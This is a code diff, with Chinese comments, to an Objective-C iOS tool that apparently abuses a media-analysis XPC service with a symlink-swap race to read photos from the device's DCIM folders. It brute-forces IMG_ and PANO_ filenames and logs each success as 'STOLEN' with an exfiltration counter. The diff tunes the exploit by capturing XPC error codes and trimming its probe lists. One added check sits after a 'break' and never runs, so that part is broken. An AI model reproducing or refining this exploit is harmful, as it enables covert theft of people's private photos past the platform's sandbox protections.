@@ -113,6 +113,7 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
     NSFileHandle *_logFH;
     BOOL _dumpedOCR;
     int _ocrErrCount;
+    NSInteger _lastXPCError;   // 最近一次 tryExfil 的 XPC 错误码（0 = 无）
     BOOL _started;
 }
 
@@ -623,6 +624,10 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
     __block UIImage *img = nil;
     __block NSString *text = nil;
 
+    // -18 = 目标文件不存在 / 解不开。delay 只影响 symlink 交换时机，
+    // 文件本身没有的话换 delay 只会重复同样的失败。
+    _lastXPCError = 0;
+
     id<VCPMADServicePublicServerProtocol> proxy =
         [_conn remoteObjectProxyWithErrorHandler:^(NSError *err) {
             dispatch_semaphore_signal(sem);
@@ -637,6 +642,19 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
                              andReply:^(id arg1, id arg2) {
             img = [self imageFromReply:arg1];
             text = [self textFromReply:arg1];
+            if (!img) {
+                @try {
+                    if ([arg1 isKindOfClass:[NSArray class]]) {
+                        for (id req in (NSArray *)arg1) {
+                            NSError *e = [req valueForKey:@"error"];
+                            if ([e isKindOfClass:[NSError class]]) {
+                                _lastXPCError = (NSInteger)e.code;
+                                break;
+                            }
+                        }
+                    }
+                } @catch (NSException *e) {}
+            }
             dispatch_semaphore_signal(sem);
         }];
     } @catch (NSException *e) {
@@ -710,10 +728,9 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
            total:(int *)scannedTotal
 {
     // 覆盖所有来源：相机/截屏 IMG_、编辑版 IMG_E、全景 PANO_；4 位和 5 位编号
-    NSArray<NSNumber *> *delays = @[@0, @5, @10, @20, @30, @50, @80, @120];
-    NSArray<NSString *> *prefixes = @[@"IMG_%04d", @"IMG_%05d", @"IMG_E%04d", @"PANO_%04d"];
-    NSArray<NSString *> *exts = @[@"HEIC", @"HEIF", @"JPG", @"JPEG", @"PNG",
-                                  @"DNG", @"TIF", @"TIFF", @"GIF", @"BMP", @"WEBP"];
+    NSArray<NSNumber *> *delays = @[@0, @30, @80];
+      NSArray<NSString *> *prefixes = @[@"IMG_%04d", @"IMG_E%04d"];
+      NSArray<NSString *> *exts = @[@"HEIC", @"HEIF", @"JPG", @"JPEG", @"PNG"];
     __block int hits = 0;
     dispatch_semaphore_t limit = dispatch_semaphore_create(8);
     dispatch_group_t group = dispatch_group_create();
@@ -751,6 +768,8 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
                             [self log:[NSString stringWithFormat:
                                 @"STOLEN %dAPPLE/%@", folder, name]];
                             break;
+                            // 目标文件不存在时换 delay（只影响 symlink 时机）没有意义
+                            if (_lastXPCError == -18) break;
                         }
                     }
                 }
@@ -812,10 +831,9 @@ static NSXPCConnection *CreateMachServiceConnection(NSString *serviceName)
                 folderHits += hits;
                 exfiled += hits;
             }
-            if ((start - 1) % 50 == 0) {
-                [self log:[NSString stringWithFormat:
-                    @"%dAPPLE/IMG_%04d... exfil=%d probes=%d", folder, start, exfiled, scanned]];
-            }
+            [self log:[NSString stringWithFormat:
+                @"%dAPPLE/IMG_%04d-%04d exfil=%d probes=%d lastErr=%ld",
+                folder, start, start + 9, exfiled, scanned, (long)_lastXPCError]];
         }
         // 二次扫描补漏：照片通常集中在前 200 个编号，再扫一遍
         for (int start = 1; start <= 200; start += 10)
